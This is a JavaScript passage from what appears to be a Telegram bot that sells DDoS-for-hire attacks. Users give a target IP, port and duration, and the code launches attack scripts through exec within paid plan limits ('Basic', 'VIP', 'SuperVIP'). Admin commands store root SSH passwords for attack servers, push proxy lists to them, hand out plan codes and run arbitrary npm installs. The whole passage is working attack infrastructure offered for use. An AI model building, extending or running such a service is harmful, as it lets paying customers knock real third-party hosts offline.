    const regex = new RegExp(`^\\/${command}\\s+(.+)$`, 'i');
    bot.onText(regex, async (msg, match) => {
        try {
            if (!await gate(msg)) return;
            const chatId = msg.chat.id;
            const args = match[1].split(/\s+/).filter(Boolean);
            if (args.length < 3)
                return bot.sendMessage(chatId, `${emoji('WARNING')} Usage: <code>/${command} <ip> <port> <seconds></code>`, { parse_mode: 'HTML' }).catch(() => {});

            const [host, portStr, timeStr] = args;
            const port = parseInt(portStr, 10);
            const time = parseInt(timeStr, 10);
            const { planType, concurrent, timeLimit } = getPlanLimits(chatId);

            if (planType !== 'VIP' && planType !== 'SuperVIP') {
                const rem = getRemainingFreeAttacks(chatId);
                if (rem <= 0)
                    return bot.sendMessage(chatId, `${emoji('CROSS')} <b>Daily limit reached.</b>`, { parse_mode: 'HTML' }).catch(() => {});
            }
            if (getUserConcurrent(chatId) >= concurrent)
                return bot.sendMessage(chatId, `${emoji('CROSS')} Concurrent: ${getUserConcurrent(chatId)}/${concurrent}`, { parse_mode: 'HTML' }).catch(() => {});
            if (!isValidIP(host))
                return bot.sendMessage(chatId, `${emoji('CROSS')} Invalid IP.`, { parse_mode: 'HTML' }).catch(() => {});
            if (isNaN(port) || port < 1 || port > 65535)
                return bot.sendMessage(chatId, `${emoji('CROSS')} Invalid port.`, { parse_mode: 'HTML' }).catch(() => {});
            if (isNaN(time) || time <= 0 || time > timeLimit)
                return bot.sendMessage(chatId, `${emoji('CROSS')} Time 1-${timeLimit}s.`, { parse_mode: 'HTML' }).catch(() => {});

            const cmd = `node cache/${command}.js ${host} ${port} ${time}`;
            addActiveAttack(chatId, host, command.toUpperCase(), time);

            bot.sendMessage(chatId,
                `${emoji('DANGER')} <b>Attack Launched</b>\n<pre>{\n` +
                `  "status":"success", "host":"${host}", "port":${port},\n` +
                `  "time":${time}, "method":"${command.toUpperCase()}",\n` +
                `  "concurrent":"${getUserConcurrent(chatId)}/${concurrent}"\n}`,
                { parse_mode: 'HTML' }).catch(() => {});

            if (planType !== 'VIP' && planType !== 'SuperVIP') incrementDailyAttackCount(chatId);
            try { const p = exec(cmd, { detached: true, stdio: 'ignore' }); p.unref(); } catch {}
        } catch (e) { console.error('L4:', e.message); }
    });
});

// ============================================================
// ==============  ADMIN COMMANDS  ============================
// ============================================================

bot.onText(/^\/addown\s+(\d+)/, async (msg, match) => {
    try {
        if (!await gate(msg)) return;
        if (!isAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} No permission.`, { parse_mode: 'HTML' }).catch(() => {});
        const id = parseInt(match[1], 10);
        if (adminIds.includes(id)) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} Already admin.`, { parse_mode: 'HTML' }).catch(() => {});
        adminIds.push(id); saveJSON(FILES.admins, adminIds);
        bot.sendMessage(msg.chat.id, `${emoji('SUCCESS')} Added admin <code>${id}</code>`, { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) {}
});

bot.onText(/^\/delown\s+(\d+)/, async (msg, match) => {
    try {
        if (!await gate(msg)) return;
        if (!isAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} No permission.`, { parse_mode: 'HTML' }).catch(() => {});
        const id = parseInt(match[1], 10);
        adminIds = adminIds.filter(x => x !== id); saveJSON(FILES.admins, adminIds);
        bot.sendMessage(msg.chat.id, `${emoji('SUCCESS')} Removed admin <code>${id}</code>`, { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) {}
});

bot.onText(/^\/listown/, async msg => {
    try {
        if (!await gate(msg)) return;
        if (!isAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} No permission.`, { parse_mode: 'HTML' }).catch(() => {});
        let r = `${emoji('LIST')} <b>Admins</b>\n<pre>[\n`;
        adminIds.forEach((id, i) => r += `  "${id}"${i < adminIds.length - 1 ? ',' : ''}\n`);
        r += `]</pre>`;
        bot.sendMessage(msg.chat.id, r, { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) {}
});

bot.onText(/^\/users/, async msg => {
    try {
        if (!await gate(msg)) return;
        if (!isAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} No permission.`, { parse_mode: 'HTML' }).catch(() => {});
        const ids = Object.keys(usersData);
        if (ids.length === 0) return bot.sendMessage(msg.chat.id, `${emoji('INFO')} No users yet.`, { parse_mode: 'HTML' }).catch(() => {});
        let r = `${emoji('LIST')} <b>Total Users: ${ids.length}</b>\n\n<pre>`;
        ids.slice(-100).forEach((id, i) => {
            const u = usersData[id];
            r += `${i + 1}. ${id} | @${u.username || '-'} | ${u.firstName || '-'}\n`;
        });
        r += `</pre>`;
        if (r.length > 3900) r = r.slice(0, 3900) + '...</pre>';
        bot.sendMessage(msg.chat.id, r, { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) {}
});

bot.onText(/^\/userinfo\s+(\d+)/, async (msg, match) => {
    try {
        if (!await gate(msg)) return;
        if (!isAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} No permission.`, { parse_mode: 'HTML' }).catch(() => {});
        const id = match[1];
        const u = usersData[id];
        if (!u) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} User not found.`, { parse_mode: 'HTML' }).catch(() => {});
        const plan = getUserPlan(id);
        const rem = getRemainingFreeAttacks(id);
        const info = {
            id, username: '@' + (u.username || '-'), name: u.firstName,
            joined: new Date(u.joinedAt).toLocaleString(),
            lastSeen: new Date(u.lastSeen).toLocaleString(),
            plan, remaining: rem === Infinity ? 'Unlimited' : rem,
            banned: isBanned(id)
        };
        bot.sendMessage(msg.chat.id, `<pre>${JSON.stringify(info, null, 2)}</pre>`, { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) {}
});

bot.onText(/^\/ban(?:\s+(\d+))?/, async (msg, match) => {
    try {
        if (!await gate(msg)) return;
        if (!isAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} No permission.`, { parse_mode: 'HTML' }).catch(() => {});
        let id = match[1] ? parseInt(match[1], 10) : (msg.reply_to_message ? msg.reply_to_message.from.id : null);
        if (!id) return bot.sendMessage(msg.chat.id, `${emoji('WARNING')} Usage: /ban <id> or reply`, { parse_mode: 'HTML' }).catch(() => {});
        if (!bannedUsers.includes(id)) bannedUsers.push(id);
        saveJSON(FILES.banned, bannedUsers);
        bot.sendMessage(msg.chat.id, `${emoji('SUCCESS')} Banned <code>${id}</code>`, { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) {}
});

bot.onText(/^\/unban(?:\s+(\d+))?/, async (msg, match) => {
    try {
        if (!await gate(msg)) return;
        if (!isAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} No permission.`, { parse_mode: 'HTML' }).catch(() => {});
        let id = match[1] ? parseInt(match[1], 10) : (msg.reply_to_message ? msg.reply_to_message.from.id : null);
        if (!id) return bot.sendMessage(msg.chat.id, `${emoji('WARNING')} Usage: /unban <id> or reply`, { parse_mode: 'HTML' }).catch(() => {});
        bannedUsers = bannedUsers.filter(x => x !== id);
        saveJSON(FILES.banned, bannedUsers);
        bot.sendMessage(msg.chat.id, `${emoji('SUCCESS')} Unbanned <code>${id}</code>`, { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) {}
});

bot.onText(/^\/banlist/, async msg => {
    try {
        if (!await gate(msg)) return;
        if (!isAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} No permission.`, { parse_mode: 'HTML' }).catch(() => {});
        if (bannedUsers.length === 0) return bot.sendMessage(msg.chat.id, `${emoji('INFO')} No banned users.`, { parse_mode: 'HTML' }).catch(() => {});
        let r = `${emoji('LIST')} <b>Banned Users</b>\n<pre>[\n`;
        bannedUsers.forEach((id, i) => r += `  "${id}"${i < bannedUsers.length - 1 ? ',' : ''}\n`);
        r += `]</pre>`;
        bot.sendMessage(msg.chat.id, r, { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) {}
});

bot.onText(/^\/maintenance(?:\s+(on|off))?(?:\s+([\s\S]+))?/, async (msg, match) => {
    try {
        if (!await gate(msg)) return;
        if (!isAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} No permission.`, { parse_mode: 'HTML' }).catch(() => {});
        const cmd = match[1];
        const text = match[2];
        if (!cmd) {
            return bot.sendMessage(msg.chat.id,
                `${emoji('INFO')} Status: <b>${maintenanceMode.enabled ? 'ON' : 'OFF'}</b>\n` +
                `Message: <i>${maintenanceMode.message || '(none)'}</i>\n\n` +
                `Usage: <code>/maintenance on [message]</code>`,
                { parse_mode: 'HTML' }).catch(() => {});
        }
        if (cmd === 'on') {
            maintenanceMode = { enabled: true, message: text || "Bot is under maintenance. Please try again later." };
            saveJSON(FILES.maintenance, maintenanceMode);
            bot.sendMessage(msg.chat.id, `${emoji('SUCCESS')} Maintenance <b>ON</b>`, { parse_mode: 'HTML' }).catch(() => {});
        } else {
            maintenanceMode = { enabled: false, message: "" };
            saveJSON(FILES.maintenance, maintenanceMode);
            bot.sendMessage(msg.chat.id, `${emoji('SUCCESS')} Maintenance <b>OFF</b>`, { parse_mode: 'HTML' }).catch(() => {});
        }
    } catch (e) {}
});

bot.onText(/^\/broadcast(?:\s+([\s\S]+))?/, async (msg, match) => {
    try {
        if (!await gate(msg)) return;
        if (!isAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} No permission.`, { parse_mode: 'HTML' }).catch(() => {});
        const text = match[1] || (msg.reply_to_message && msg.reply_to_message.text);
        if (!text) return bot.sendMessage(msg.chat.id, `${emoji('WARNING')} Provide message or reply to one.`, { parse_mode: 'HTML' }).catch(() => {});
        const ids = Object.keys(usersData);
        bot.sendMessage(msg.chat.id, `${emoji('LIGHTNING')} Broadcasting to ${ids.length} users...`, { parse_mode: 'HTML' }).catch(() => {});
        let ok = 0, fail = 0;
        for (const id of ids) {
            try { await bot.sendMessage(id, `${emoji('MEGAPHONE')} <b>Announcement</b>\n\n${text}`, { parse_mode: 'HTML' }); ok++; }
            catch { fail++; }
            await new Promise(r => setTimeout(r, 60));
        }
        bot.sendMessage(msg.chat.id, `${emoji('SUCCESS')} Done. OK: ${ok} | Fail: ${fail}`, { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) { console.error('/broadcast:', e.message); }
});

bot.onText(/^\/give(?:\s+(\d+))?\s+(\d+[smhd])\s+(Basic|VIP|SuperVIP)/, async (msg, match) => {
    try {
        if (!await gate(msg)) return;
        if (!isAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} No permission.`, { parse_mode: 'HTML' }).catch(() => {});
        let target = match[1] ? parseInt(match[1], 10) : (msg.reply_to_message ? msg.reply_to_message.from.id : null);
        if (!target) return bot.sendMessage(msg.chat.id, `${emoji('WARNING')} Usage: /give <id> <dur> <plan> OR reply to user`, { parse_mode: 'HTML' }).catch(() => {});
        const duration = match[2], plan = match[3];
        const num = parseInt(duration);
        let exp = Date.now();
        if (duration.endsWith('s')) exp += num * 1000;
        else if (duration.endsWith('m')) exp += num * 60000;
        else if (duration.endsWith('h')) exp += num * 3600000;
        else exp += num * 86400000;
        const code = Math.random().toString(36).substr(2, 12);
        const plans = loadJSON(FILES.plans, []).filter(p => String(p.id) !== String(target));
        plans.push({ id: target, expiry: exp, claimed: false, claimCode: code, planType: plan });
        saveJSON(FILES.plans, plans);
        const cc = loadJSON(FILES.claims, []);
        cc.push({ code, expiry: exp, planType: plan });
        saveJSON(FILES.claims, cc);
        bot.sendMessage(msg.chat.id,
            `${emoji('SUCCESS')} <b>${plan}</b> → <code>${target}</code>\n` +
            `Exp: <b>${new Date(exp).toLocaleString()}</b>\nCode: <code>${code}</code>`,
            { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) {}
});

bot.onText(/^\/claim\s+(\w{8,16})/, async (msg, match) => {
    try {
        if (!await gate(msg)) return;
        const code = match[1];
        const chatId = msg.from.id;
        let cc = loadJSON(FILES.claims, []);
        const found = cc.find(c => c.code === code);
        if (!found) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} Invalid code.`, { parse_mode: 'HTML' }).catch(() => {});
        if (Date.now() > found.expiry) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} Code expired.`, { parse_mode: 'HTML' }).catch(() => {});
        let plans = loadJSON(FILES.plans, []);
        let up = plans.find(p => String(p.id) === String(chatId));
        if (!up) plans.push({ id: chatId, claimed: true, expiry: found.expiry, planType: found.planType });
        else { up.claimed = true; up.expiry = found.expiry; up.planType = found.planType; }
        cc = cc.filter(c => c.code !== code);
        saveJSON(FILES.claims, cc);
        saveJSON(FILES.plans, plans);
        const lim = getPlanLimits(chatId);
        bot.sendMessage(msg.chat.id,
            `${emoji('SUCCESS')} <b>Claimed!</b>\nPlan: <b>${lim.planType}</b>\n` +
            `Exp: <b>${new Date(found.expiry).toLocaleString()}</b>\n` +
            `Time: <b>${lim.timeLimit}s</b> | Concurrent: <b>${lim.concurrent}</b>`,
            { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) {}
});

bot.onText(/^\/listuser/, async msg => {
    try {
        if (!await gate(msg)) return;
        if (!isAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} No permission.`, { parse_mode: 'HTML' }).catch(() => {});
        const plans = loadJSON(FILES.plans, []);
        if (plans.length === 0) return bot.sendMessage(msg.chat.id, `${emoji('INFO')} No active plans.`, { parse_mode: 'HTML' }).catch(() => {});
        let r = `${emoji('LIST')} <b>Active Plans</b>\n\n<pre>`;
        plans.forEach(p => r += `${p.id} | ${p.planType} | ${new Date(p.expiry).toLocaleDateString()}\n`);
        r += `</pre>`;
        bot.sendMessage(msg.chat.id, r, { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) {}
});

bot.onText(/^\/addsrv\s+(\d+\.\d+\.\d+\.\d+)\s+(\S+)\s+(\d+)/, async (msg, match) => {
    try {
        if (!await gate(msg)) return;
        if (!isAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} No permission.`, { parse_mode: 'HTML' }).catch(() => {});
        const ip = match[1], pw = match[2], port = parseInt(match[3]);
        if (vpsList.find(v => v.ip === ip)) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} IP exists.`, { parse_mode: 'HTML' }).catch(() => {});
        const idx = vpsList.length ? vpsList[vpsList.length - 1].index + 1 : 1;
        vpsList.push({ index: idx, ip, password: pw, port });
        saveJSON(FILES.vps, vpsList);
        bot.sendMessage(msg.chat.id, `${emoji('SUCCESS')} VPS added: ${ip}:${port}`, { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) {}
});

bot.onText(/^\/delsrv\s+(.+)/, async (msg, match) => {
    try {
        if (!await gate(msg)) return;
        if (!isAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} No permission.`, { parse_mode: 'HTML' }).catch(() => {});
        const key = match[1].trim();
        const idx = parseInt(key);
        const v = !isNaN(idx) ? vpsList.find(x => x.index === idx) : vpsList.find(x => x.ip === key);
        if (!v) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} Not found.`, { parse_mode: 'HTML' }).catch(() => {});
        vpsList.splice(vpsList.indexOf(v), 1);
        saveJSON(FILES.vps, vpsList);
        bot.sendMessage(msg.chat.id, `${emoji('SUCCESS')} Deleted ${v.ip}`, { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) {}
});

bot.onText(/^\/listsrv/, async msg => {
    try {
        if (!await gate(msg)) return;
        if (!isAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} No permission.`, { parse_mode: 'HTML' }).catch(() => {});
        if (vpsList.length === 0) return bot.sendMessage(msg.chat.id, `${emoji('INFO')} No VPS.`, { parse_mode: 'HTML' }).catch(() => {});
        bot.sendMessage(msg.chat.id, `${emoji('DESKTOP')} Checking VPS...`, { parse_mode: 'HTML' }).catch(() => {});
        let r = `${emoji('DESKTOP')} <b>VPS Status</b>\n<pre>[\n`;
        let on = 0, off = 0;
        for (const v of vpsList) {
            const ok = await new Promise(res => {
                const c = new Client();
                const t = setTimeout(() => { res(false); try { c.end(); } catch {} }, 8000);
                c.on('ready', () => { clearTimeout(t); res(true); c.end(); })
                 .on('error', () => { clearTimeout(t); res(false); })
                 .connect({ host: v.ip, port: v.port, username: 'root', password: v.password, readyTimeout: 8000 });
            });
            if (ok) { on++; r += `  { "${v.ip}": "online" },\n`; } else { off++; r += `  { "${v.ip}": "offline" },\n`; }
        }
        r += `]</pre>\n${emoji('CHECK')} Online: ${on} | ${emoji('CROSS')} Offline: ${off}`;
        bot.sendMessage(msg.chat.id, r, { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) {}
});

bot.onText(/^\/install\s+(.+)/, async (msg, match) => {
    try {
        if (!await gate(msg)) return;
        if (!isAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} No permission.`, { parse_mode: 'HTML' }).catch(() => {});
        const mod = match[1].trim();
        bot.sendMessage(msg.chat.id, `${emoji('DOWNLOAD')} Installing ${mod}...`, { parse_mode: 'HTML' }).catch(() => {});
        exec(`npm install ${mod}`, { timeout: 120000 }, (err) => {
            if (err) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} Failed: <pre>${err.message}</pre>`, { parse_mode: 'HTML' }).catch(() => {});
            bot.sendMessage(msg.chat.id, `${emoji('SUCCESS')} Installed ${mod}`, { parse_mode: 'HTML' }).catch(() => {});
        });
    } catch (e) {}
});

bot.onText(/^\/upload\s+(\d+)/, async (msg, match) => {
    try {
        if (!await gate(msg)) return;
        if (!isAdmin(msg.from.id)) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} No permission.`, { parse_mode: 'HTML' }).catch(() => {});
        const idx = parseInt(match[1]);
        const v = vpsList.find(x => x.index === idx);
        if (!v) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} VPS not found.`, { parse_mode: 'HTML' }).catch(() => {});
        if (!msg.reply_to_message || !msg.reply_to_message.document) return bot.sendMessage(msg.chat.id, `${emoji('WARNING')} Reply to a .txt file.`, { parse_mode: 'HTML' }).catch(() => {});
        const doc = msg.reply_to_message.document;
        if (!doc.file_name.toLowerCase().endsWith('.txt')) return bot.sendMessage(msg.chat.id, `${emoji('CROSS')} Only .txt.`, { parse_mode: 'HTML' }).catch(() => {});
        const link = await bot.getFileLink(doc.file_id);
        bot.sendMessage(msg.chat.id, `${emoji('DOWNLOAD')} Downloading...`, { parse_mode: 'HTML' }).catch(() => {});
        const fp = './proxy.txt';
        const st = fs.createWriteStream(fp);
        https.get(link, res => {
            res.pipe(st);
            st.on('finish', () => {
                st.close();
                const c = new Client();
                c.on('ready', () => {
                    c.sftp((e, sftp) => {
                        if (e) { bot.sendMessage(msg.chat.id, `${emoji('CROSS')} SFTP err.`, { parse_mode: 'HTML' }).catch(() => {}); return c.end(); }
                        sftp.fastPut(fp, './TAR/proxy.txt', err => {
                            if (err) bot.sendMessage(msg.chat.id, `${emoji('CROSS')} Upload fail.`, { parse_mode: 'HTML' }).catch(() => {});
                            else bot.sendMessage(msg.chat.id, `${emoji('SUCCESS')} Uploaded!`, { parse_mode: 'HTML' }).catch(() => {});
                            c.end();
                        });
                    });
                }).on('error', () => bot.sendMessage(msg.chat.id, `${emoji('CROSS')} Connect fail.`, { parse_mode: 'HTML' }).catch(() => {}))
                  .connect({ host: v.ip, port: v.port || 22, username: 'root', password: v.password });
            });
        }).on('error', () => bot.sendMessage(msg.chat.id, `${emoji('CROSS')} Download fail.`, { parse_mode: 'HTML' }).catch(() => {}));
    } catch (e) { console.error('/upload:', e.message); }
});

bot.onText(/^\/controlmenu/, async msg => {
    try {
        if (!await gate(msg)) return;
        bot.sendMessage(msg.chat.id,
            `${emoji('CONTROL')} <b>Control Menu</b>\n\n` +
            `${emoji('PLUS')} /addown &lt;id&gt;\n` +
            `${emoji('MINUS')} /delown &lt;id&gt;\n` +
            `${emoji('LIST')} /listown\n` +
            `${emoji('LIST')} /users\n` +
            `${emoji('INFO')} /userinfo &lt;id&gt;\n` +
            `${emoji('CROSS')} /ban &lt;id|reply&gt;\n` +
            `${emoji('CHECK')} /unban &lt;id|reply&gt;\n` +
            `${emoji('LIST')} /banlist\n` +
            `${emoji('MEGAPHONE')} /broadcast &lt;text&gt;\n` +
            `${emoji('WARNING')} /maintenance on|off [msg]\n` +
            `${emoji('GIFT')} /give &lt;id&gt; &lt;dur&gt; &lt;plan&gt;\n` +
            `${emoji('LIST')} /listuser\n` +
            `${emoji('PLUS')} /addsrv ip pass port\n` +
            `${emoji('MINUS')} /delsrv ip|index\n` +
            `${emoji('LIST')} /listsrv\n` +
            `${emoji('DOWNLOAD')} /install &lt;npm-pkg&gt;\n` +
            `${emoji('UPLOAD')} /upload &lt;index&gt; (reply to .txt)`,
            { parse_mode: 'HTML' }).catch(() => {});
    } catch (e) {}
});

// ===== CLEANUP =====
setInterval(() => {
    try {
        const plans = loadJSON(FILES.plans, []);
        const cleaned = plans.filter(p => Date.now() < p.expiry);
        if (cleaned.length !== plans.length) saveJSON(FILES.plans, cleaned);
    } catch {}
}, 60000);

console.log('✅ Bot running — all features active');